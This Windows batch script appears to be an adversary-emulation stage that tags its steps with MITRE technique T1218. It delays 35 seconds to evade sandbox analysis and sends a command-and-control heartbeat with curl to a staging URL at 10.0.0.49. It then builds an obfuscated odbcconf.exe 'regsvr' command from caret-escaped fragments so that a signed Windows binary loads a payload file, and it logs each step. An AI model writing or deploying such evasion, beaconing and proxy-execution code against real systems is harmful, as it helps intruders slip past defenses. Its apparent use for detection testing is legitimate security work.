@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET ghmqxp=%APPDATA%\8270\ae76371b
SET vbnfkd=Macula-Stage0-8270
SET zlkjnm=https://10.0.0.49
SET qwrtpl=https://10.0.0.49/stage/2/icon.png?8270-7
SET jhgfds=BALAM-S2BO
SET mnbvcx=7
SET lkjhgf=help.txt
SET poiuyy=8270

REM Log file path
SET logfile=%APPDATA%\!mnbvcx!\macula-simulations.log

REM Initial delay to evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: initial_delay_start>> "!logfile!" 2>nul
timeout /t 35 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: initial_delay_complete>> "!logfile!" 2>nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!qwrtpl!"
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: heartbeat_complete>> "!logfile!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: chdir_start target=!ghmqxp!>> "!logfile!" 2>nul
cd /d "!ghmqxp!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: chdir_complete result=%ERRORLEVEL%>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 5 >nul

REM Build heavily obfuscated odbcconf command for T1218 using variable fragments
SET ex1=o^d
SET ex2=b^c
SET ex3=c^o
SET ex4=n^f^.
SET ex5=e^x
SET ex6=e
SET fullodbc=%WINDIR%\System32\!ex1!!ex2!!ex3!!ex4!!ex5!!ex6!

REM Fragment command arguments with irregular spacing and escapes
SET a1=r^e^g
SET a2=s^v^r
SET a3= 
SET a4=/s
SET a5=  
SET a6=
SET argstr=!a1!!a2!!a3!!a4!!a5!!a6!

echo [%DATE% %TIME%][DEBUG][!jhgfds!]: process_start lolbin=odbcconf.exe>> "!logfile!" 2>nul

SET result=1
SET err_detail=
FOR /F "tokens=*" %%I IN ('echo !fullodbc! !argstr! "!lkjhgf!"') DO (
    %%I 2>nul
)
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=0
    SET err_detail=process_failed
)
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: process_complete result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Random delay
SET /A delay=%RANDOM% %% 25 + 15
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: random_delay_start seconds=!delay!>> "!logfile!" 2>nul
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: random_delay_complete>> "!logfile!" 2>nul

REM Build timestamp for TTP log
set timestamp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!

REM TTP logging for T1218
echo [!timestamp!][!jhgfds!]: !mnbvcx!-!poiuyy!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!logfile!" 2>nul

ping -n 3 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!jhgfds!]: script_complete>> "!logfile!" 2>nul